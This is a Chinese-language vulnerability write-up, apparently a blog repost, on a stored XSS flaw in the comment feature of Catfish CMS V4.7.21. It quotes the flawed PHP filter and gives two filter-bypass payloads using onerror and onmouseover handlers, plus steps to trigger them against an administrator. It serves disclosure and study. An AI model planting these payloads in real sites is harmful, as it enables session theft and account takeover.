---
title: Catfish cms V 4.7.21 存储性xss
date: 2018-4-8 8:50:30
tags: Web安全
toc: true
---

本文首发 [先知社区 Catfish(鲶鱼) CMS V 4.7.21 存储型XSS漏洞](https://xz.aliyun.com/t/2253)
> Catfish(鲶鱼) CMS
> 开源免费的PHP内容管理系统
不需要高深专业技术轻松搭建网站
使用简单　灵活方便　稳定快捷
风格切换　想换就换　适应不同需求
最新版本：V 4.7.21
http://www.catfish-cms.com/

### 分析

文件在 \application\index\controller\Index.php 评论处存在xss

```
public function pinglun()
{
    $beipinglunren = Db::name('posts')->where('id',Request::instance()->post('id'))->field('post_author')->find();
    if($beipinglunren['post_author'] != Session::get($this->session_prefix.'user_id'))
    {
        $comment = Db::name('options')->where('option_name','comment')->field('option_value')->find();
        $plzt = 1;
        if($comment['option_value'] == 1)
        {
            $plzt = 0;
        }
        $data = [
                'post_id' => Request::instance()->post('id'),
                'url' => 'index/Index/article/id/'.Request::instance()->post('id'),
                'uid' => Session::get($this->session_prefix.'user_id'),
                'to_uid' => $beipinglunren['post_author'],
                'createtime' => date("Y-m-d H:i:s"),
                'content' => $this->filterJs(Request::instance()->post('pinglun')),
                'status' => $plzt
        ];
        Db::name('comments')->insert($data);
        Db::name('posts')
                ->where('id', Request::instance()->post('id'))
                ->update([
                    'post_comment' => date("Y-m-d H:i:s"),
                    'comment_count' => ['exp','comment_count+1']
                ]);
        $param = '';
        Hook::add('comment_post',$this->plugins);
        Hook::listen('comment_post',$param,$this->ccc);
    }
}
```

问题点如下：

        'content' => $this->filterJs(Request::instance()->post('pinglun')),
        Db::name('comments')->insert($data);
data中的content经filterJs过滤后插入数据库

filterJs过滤函数如下
```php
protected function filterJs($str)
{
    while(stripos($str,'<script') !== false || stripos($str,'<style') !== false || stripos($str,'<iframe') !== false || stripos($str,'<frame') !== false || stripos($str,'onclick') !== false)
    {
        $str = preg_replace(['/<script[\s\S]*?<\/script[\s]*>/i','/<style[\s\S]*?<\/style[\s]*>/i','/<iframe[\s\S]*?[<\/iframe|\/][\s]*>/i','/<frame[\s\S]*?[<\/frame|\/][\s]*>/i','/on[A-Za-z]+[\s]*=[\s]*[\'|"][\s\S]*?[\'|"]/i'],'',$str);
    }
    return $str;
}
```
正则有问题。
列举2个绕过payload

```html
    <img src=x onerror=alert(1)> 
    <p onmouseover="javascript:alert(1);">M</p>
```

### 验证

注册用户登陆，对文章评论
![](https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d5462f04-3b31-1.png)

提交评论抓包改为

![](https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d5611116-3b31-1.png)

浏览文章或管理员登陆后台可触发
![](https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d57f5662-3b31-1.png)
![](https://xzfile.aliyuncs.com/media/upload/picture/20180408213625-d59401ac-3b31-1.png)